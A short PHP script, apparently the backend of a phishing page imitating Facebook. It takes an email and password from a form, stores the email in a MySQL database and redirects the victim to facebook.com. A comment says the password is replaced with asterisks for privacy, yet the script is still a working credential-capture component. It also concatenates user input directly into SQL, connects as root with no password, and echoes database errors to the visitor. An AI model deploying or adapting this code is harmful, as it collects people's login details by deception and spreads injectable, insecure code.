<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "prueba";
$port = 3306;

$Co = $_POST['elcorreo'];
$Ca = $_POST['lacontra'];

$conn = mysqli_connect($servername,$username,$password,$dbname);

if(!$conn)  {
    die("Connection failes:".mysqli_connect_error());
}

$sql = "INSERT INTO prueba (Correo,Contra) VALUES ('$Co','**')";	//Por motivos de privacidad, hemos enviado a la base de datos en el campo “Contra” dos asteriscos para que las contraseñas sigan privada.

if(mysqli_query($conn,$sql))    {
    header('Location: https://www.facebook.com/');
} else  {
    echo "Error: ".$sql."<br>".mysqli_error($conn);
}

mysqli_close($conn);

?>